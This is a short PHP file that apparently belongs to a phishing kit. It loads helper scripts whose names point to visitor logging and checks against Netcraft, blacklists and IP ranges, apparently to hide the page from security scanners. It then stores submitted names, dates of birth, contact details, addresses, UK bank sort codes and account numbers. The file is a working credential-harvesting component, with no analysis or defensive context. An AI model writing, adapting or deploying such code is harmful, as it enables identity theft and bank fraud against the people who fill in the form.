<?php
require "assets/includes/visitor_log.php";
require "assets/includes/netcraft_check.php";
require "assets/includes/blacklist_lookup.php";
require "assets/includes/ip_range_check.php";
$_SESSION['name'] = $_POST['name'];
$_SESSION['dob'] = $_POST['dob'];
$_SESSION['email'] = $_POST['email'];
$_SESSION['telephone'] = $_POST['telephone'];
$_SESSION['address'] = $_POST['address'];
$_SESSION['town'] = $_POST['town'];
$_SESSION['postcode'] = $_POST['postcode'];
$_SESSION['sortcode'] = $_POST['sortcode'];
$_SESSION['account'] = $_POST['account'];
?>